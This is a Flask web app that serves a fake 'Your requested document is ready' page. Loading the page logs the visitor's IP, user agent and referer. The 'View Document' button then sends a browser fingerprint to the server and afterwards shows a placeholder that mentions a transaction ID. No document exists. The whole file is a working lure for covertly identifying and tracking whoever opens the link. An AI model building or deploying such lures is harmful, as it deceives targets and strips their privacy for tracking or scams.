from flask import Flask, request, render_template_string
import datetime
import json

app = Flask(__name__)

LOG_FILE = "visitors.log"

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Secure Document</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; text-align: center; padding: 40px; }
        .notice { font-size: 12px; color: #888; margin-top: 30px; }
    </style>
</head>
<body>
    <h2>Your requested document is ready</h2>
    <p>Click below to view.</p>
    <button onclick="sendFingerprint()" style="padding:10px 20px;">View Document</button>
    <div id="status"></div>
    <p class="notice">This site collects technical data to prevent misuse. By clicking, you agree.</p>
    <script>
        async function sendFingerprint() {
            const fp = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                timestamp: new Date().toISOString()
            };
            try {
                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(fp)
                });
                document.getElementById('status').innerText = 'Thank you! The document is loading...';
                // Simulate a loading delay then show a fake "file" or just do nothing
                setTimeout(() => {
                    document.body.innerHTML = '<h2>Document Loaded</h2><p>This is a placeholder. The transaction ID will be verified shortly.</p>';
                }, 2000);
            } catch (e) {
                console.error(e);
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    # Log basic request data immediately
    log_entry = {
        "ip": request.remote_addr,
        "user_agent_raw": request.headers.get('User-Agent'),
        "referer": request.headers.get('Referer'),
        "timestamp": datetime.datetime.utcnow().isoformat()
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(log_entry) + "\n")
    return render_template_string(HTML_PAGE)

@app.route('/log', methods=['POST'])
def log_fingerprint():
    data = request.get_json()
    # Merge with IP and other headers we already have
    entry = {
        "ip": request.remote_addr,
        "fingerprint": data
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    return "ok"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)